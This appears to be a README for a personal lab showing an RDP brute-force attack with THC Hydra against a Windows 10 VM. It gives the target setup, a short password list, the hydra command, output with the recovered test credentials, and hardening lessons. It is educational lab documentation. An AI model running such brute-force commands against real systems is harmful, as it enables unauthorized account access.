# RDP-Brute-Force-Attack-Lab-with-Hydra

![Lab Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-UTM%20on%20macOS-lightgrey?style=for-the-badge&logo=apple)
![Tool](https://img.shields.io/badge/Tool-THC%20Hydra-red?style=for-the-badge&logo=kali-linux)

## Overview

This lab demonstrates a brute-force attack against Remote Desktop Protocol (RDP) using **Hydra** within an isolated and controlled test environment built on **UTM** running on a **MacBook Air M1**. The goal is to test password strength and understand the importance of hardening RDP access.

>  **Legal Disclaimer**: This lab was performed in a **private test environment**. Never conduct unauthorized testing on live or production systems.

---

## Lab Configuration

| Component        | Details                               |
|------------------|----------------------------------------|
| **Host System**  | MacBook Air M1                         |
| **Hypervisor**   | UTM                                    |
| **Attacker VM**  | Kali Linux (Hydra pre-installed)       |
| **Target VM**    | Windows 10 Pro                         |
| **Network Mode** | Emulated VLAN (Host-Only)              |
| **Tool Used**    | THC Hydra                              |

---

## Network Setup

- **Emulated VLAN** used for host-only communication
- Both VMs configured on the same VLAN: `cyberlab`
- IP addresses assigned:
  - Kali Linux: `192.168.128....`
  - Windows 10: `192.168.1128...`

---

## Windows Target Setup

1. Enabled Remote Desktop via `sysdm.cpl`.
2. Disabled Network Level Authentication (for Hydra compatibility).
3. Created a user:
   ```cmd
   net user testuser P@ssw0rd123 /add
   net localgroup "Remote Desktop Users" testuser /add
   ```
4. Allowed RDP through Windows Firewall.

---

## Attack Execution (Hydra)

**Password List** (`rdp-pass.txt`)
```text
123456
password
P@ssw0rd123
letmein
welcome1
```

**Hydra Command**
```bash
hydra -V -f -l testuser -P rdp-pass.txt rdp://192.168.128...
```

**Options Explained**
- `-V`: Verbose mode
- `-f`: Exit after first valid login
- `-l`: Username
- `-P`: Password list
- `rdp://`: RDP protocol and target IP

**Sample Output**
```
[3386][rdp] host: 192.168.100.20   login: testuser   password: P@ssw0rd123
```

---

## Result

- **Success**: Hydra successfully identified valid RDP credentials.
- **Credentials**:
  - Username: `testuser`
  - Password: `P@ssw0rd123`

---

## Lessons Learned

- RDP is vulnerable to brute-force without additional protections.
- Weak/default passwords are easily exploitable.
- Always implement:
  - Account lockout policies
  - Network Level Authentication (NLA)
  - Strong password requirements
  - VPN or firewall restrictions

---

## Skills Demonstrated

-  Virtual network setup using UTM and Emulated VLAN
-  Offensive tooling: THC Hydra
-  Service enumeration and protocol targeting (RDP/3389)
-  Documentation and ethical hacking methodology
-  Windows privilege management and configuration

---

##  Repository Structure

```text
/
├── rdp-pass.txt              # Custom password list
├── README.md                 # Lab documentation
├── screenshots/              # (Optional) Screenshots of attack steps
└── notes.md                  # Personal notes or reflections
```

---

## License

This project is for **educational and ethical use only**. Do not use these techniques on systems you do not own or have permission to test.
